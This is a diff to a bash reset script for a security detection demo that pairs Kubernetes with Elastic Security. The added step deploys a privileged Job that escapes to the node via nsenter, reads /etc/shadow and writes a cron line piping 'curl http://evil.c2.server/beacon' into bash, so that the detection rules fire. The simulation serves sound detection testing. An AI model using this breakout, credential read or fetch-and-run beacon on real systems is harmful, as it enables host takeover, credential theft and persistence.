@@ -1,14 +1,16 @@
 #!/bin/bash
 ################################################################################
-# D4C2 Demo - Soft Reset for Practice Runs
+# D4C2 Demo - Reset and Run
 #
-# Quickly resets the demo environment WITHOUT recreating infrastructure:
-#   1. Deletes the crypto miner Job from K8s
-#   2. Disables detection rule (prevents alert re-creation during cleanup)
-#   3. Deletes Elastic Security alerts for our detection rule
-#   4. Re-enables detection rule (resets suppression window)
+# Resets the demo environment and runs the attack, ending with 2 alerts:
+#   1. Cleans up previous K8s attack jobs
+#   2. Disables detection rules (prevents re-firing during cleanup)
+#   3. Deletes Elastic Security alerts
+#   4. Re-enables detection rules (resets suppression windows)
 #   5. Deletes Elastic Security cases
 #   6. Verifies readiness (agents healthy, events flowing)
+#   7. Runs container breakout attack (nsenter escape + credential harvesting)
+#   8. Waits for and verifies 2 alerts appear in the Security UI
 #
 # Usage:
 #   ./scripts/reset-demo.sh
@@ -52,6 +54,7 @@ print_info "Control: $CONTROL_IP"
 
 RULE_NAME_CRYPTO="Crypto Miner Detected (xmrig in /tmp)"
 RULE_NAME_NODE="Container Breakout via nsenter (Node-Level Escape)"
+RULE_NAME_CRED="Sensitive File Access from Container (Credential Harvesting)"
 
 ################################################################################
 # STEP 2: Clean up K8s attack job
@@ -79,8 +82,9 @@ ALL_RULES=$(curl -s \
 
 RULE_ID_CRYPTO=$(echo "$ALL_RULES" | jq -r ".data[] | select(.name==\"${RULE_NAME_CRYPTO}\") | .id" 2>/dev/null)
 RULE_ID_NODE=$(echo "$ALL_RULES" | jq -r ".data[] | select(.name==\"${RULE_NAME_NODE}\") | .id" 2>/dev/null)
+RULE_ID_CRED=$(echo "$ALL_RULES" | jq -r ".data[] | select(.name==\"${RULE_NAME_CRED}\") | .id" 2>/dev/null)
 
-for RULE_PAIR in "${RULE_NAME_CRYPTO}|${RULE_ID_CRYPTO}" "${RULE_NAME_NODE}|${RULE_ID_NODE}"; do
+for RULE_PAIR in "${RULE_NAME_CRYPTO}|${RULE_ID_CRYPTO}" "${RULE_NAME_NODE}|${RULE_ID_NODE}" "${RULE_NAME_CRED}|${RULE_ID_CRED}"; do
     RNAME="${RULE_PAIR%%|*}"
     RID="${RULE_PAIR##*|}"
     if [ -n "$RID" ] && [ "$RID" != "null" ]; then
@@ -121,7 +125,8 @@ DELETE_RESPONSE=$(curl -s \
             \"bool\": {
                 \"should\": [
                     {\"term\": {\"kibana.alert.rule.name\": \"${RULE_NAME_CRYPTO}\"}},
-                    {\"term\": {\"kibana.alert.rule.name\": \"${RULE_NAME_NODE}\"}}
+                    {\"term\": {\"kibana.alert.rule.name\": \"${RULE_NAME_NODE}\"}},
+                    {\"term\": {\"kibana.alert.rule.name\": \"${RULE_NAME_CRED}\"}}
                 ],
                 \"minimum_should_match\": 1
             }
@@ -150,7 +155,8 @@ elif echo "$DELETE_RESPONSE" | jq -e '.error' > /dev/null 2>&1; then
                         {\"bool\": {
                             \"should\": [
                                 {\"term\": {\"kibana.alert.rule.name\": \"${RULE_NAME_CRYPTO}\"}},
-                                {\"term\": {\"kibana.alert.rule.name\": \"${RULE_NAME_NODE}\"}}
+                                {\"term\": {\"kibana.alert.rule.name\": \"${RULE_NAME_NODE}\"}},
+                                {\"term\": {\"kibana.alert.rule.name\": \"${RULE_NAME_CRED}\"}}
                             ],
                             \"minimum_should_match\": 1
                         }}
@@ -175,7 +181,7 @@ fi
 
 print_phase "STEP 5: Re-enabling detection rule"
 
-for RULE_PAIR in "${RULE_NAME_CRYPTO}|${RULE_ID_CRYPTO}" "${RULE_NAME_NODE}|${RULE_ID_NODE}"; do
+for RULE_PAIR in "${RULE_NAME_CRYPTO}|${RULE_ID_CRYPTO}" "${RULE_NAME_NODE}|${RULE_ID_NODE}" "${RULE_NAME_CRED}|${RULE_ID_CRED}"; do
     RNAME="${RULE_PAIR%%|*}"
     RID="${RULE_PAIR##*|}"
     if [ -n "$RID" ] && [ "$RID" != "null" ]; then
@@ -264,15 +270,138 @@ else
 fi
 
 ################################################################################
-# Ready
+# STEP 8: Run container breakout attack
+################################################################################
+
+print_phase "STEP 8: Running container breakout attack"
+
+# Create the breakout job manifest
+cat <<'JOBEOF' > /tmp/node-breakout-job.yaml
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: node-breakout-sim
+  namespace: default
+spec:
+  ttlSecondsAfterFinished: 300
+  template:
+    spec:
+      hostPID: true
+      containers:
+      - name: breakout
+        image: ubuntu:22.04
+        command: ["/bin/bash", "-c"]
+        args:
+          - |
+            echo "=== Stage 1: Container escape via nsenter ==="
+            nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash -c '
+              echo "=== Stage 2: Host reconnaissance ==="
+              whoami
+              hostname
+              uname -a
+              cat /etc/os-release
+              ip addr show 2>/dev/null || ifconfig 2>/dev/null
+
+              echo "=== Stage 3: Credential harvesting ==="
+              cat /etc/shadow
+
+              echo "=== Stage 4: Persistence ==="
+              echo "* * * * * root curl -s http://evil.c2.server/beacon | bash" > /tmp/.hidden-cron
+              echo "Backdoor cron installed at /tmp/.hidden-cron"
+            '
+            echo "Container breakout simulation complete"
+            sleep 60
+        securityContext:
+          privileged: true
+      restartPolicy: Never
+  backoffLimit: 0
+JOBEOF
+
+scp -i "$SSH_KEY" -o StrictHostKeyChecking=no \
+  /tmp/node-breakout-job.yaml ubuntu@${CONTROL_IP}:/tmp/
+
+ssh -i "$SSH_KEY" -o StrictHostKeyChecking=no ubuntu@${CONTROL_IP} \
+  "kubectl apply -f /tmp/node-breakout-job.yaml"
+
+print_info "Container breakout job deployed."
+
+################################################################################
+# STEP 9: Wait for alerts
+################################################################################
+
+print_phase "STEP 9: Waiting for detection alerts"
+
+EXPECTED_ALERTS=2
+MAX_WAIT=120
+WAITED=0
+
+while true; do
+    ALERT_COUNT=$(curl -s \
+        -u "elastic:${ES_PASSWORD}" \
+        -H "Content-Type: application/json" \
+        "${ES_URL}/.alerts-security.alerts-default/_count" \
+        -d '{
+            "query": {
+                "bool": {
+                    "must": [
+                        {"term": {"kibana.alert.workflow_status": "open"}},
+                        {"range": {"@timestamp": {"gte": "now-5m"}}}
+                    ]
+                }
+            }
+        }' 2>/dev/null | jq -r '.count // 0' 2>/dev/null)
+
+    if [ "$ALERT_COUNT" -ge "$EXPECTED_ALERTS" ] 2>/dev/null; then
+        print_info "Got ${ALERT_COUNT} alert(s) — detection confirmed!"
+        break
+    fi
+
+    if [ "$WAITED" -ge "$MAX_WAIT" ]; then
+        print_warn "Timed out after ${MAX_WAIT}s with ${ALERT_COUNT}/${EXPECTED_ALERTS} alerts."
+        break
+    fi
+
+    echo "  Waiting for alerts... ${ALERT_COUNT}/${EXPECTED_ALERTS} (${WAITED}s / ${MAX_WAIT}s)"
+    sleep 10
+    WAITED=$((WAITED + 10))
+done
+
+################################################################################
+# STEP 10: Verify alerts
+################################################################################
+
+print_phase "STEP 10: Verifying alerts"
+
+ALERT_NAMES=$(curl -s \
+    -u "elastic:${ES_PASSWORD}" \
+    -H "Content-Type: application/json" \
+    "${ES_URL}/.alerts-security.alerts-default/_search" \
+    -d '{
+        "query": {
+            "bool": {
+                "must": [
+                    {"term": {"kibana.alert.workflow_status": "open"}},
+                    {"range": {"@timestamp": {"gte": "now-5m"}}}
+                ]
+            }
+        },
+        "size": 10,
+        "_source": ["kibana.alert.rule.name", "kibana.alert.severity"]
+    }' 2>/dev/null | jq -r '.hits.hits[]._source | "\(.["kibana.alert.severity"]): \(.["kibana.alert.rule.name"])"' 2>/dev/null)
+
+if [ -n "$ALERT_NAMES" ]; then
+    echo "$ALERT_NAMES" | while read -r line; do
+        print_info "  $line"
+    done
+else
+    print_warn "No alerts found — check rule configuration."
+fi
+
+################################################################################
+# Done
 ################################################################################
 
 print_phase "Demo Reset Complete"
 
-print_info "Environment is ready for the next demo run."
-echo ""
-print_info "Run the attacks with:"
-echo ""
-echo "  ./scripts/attack.sh         # Container-level: crypto miner"
-echo "  ./scripts/attack-node.sh    # Node-level: container breakout via nsenter"
+print_info "Alerts visible at: ${KIBANA_URL}/app/security/alerts"
 echo ""
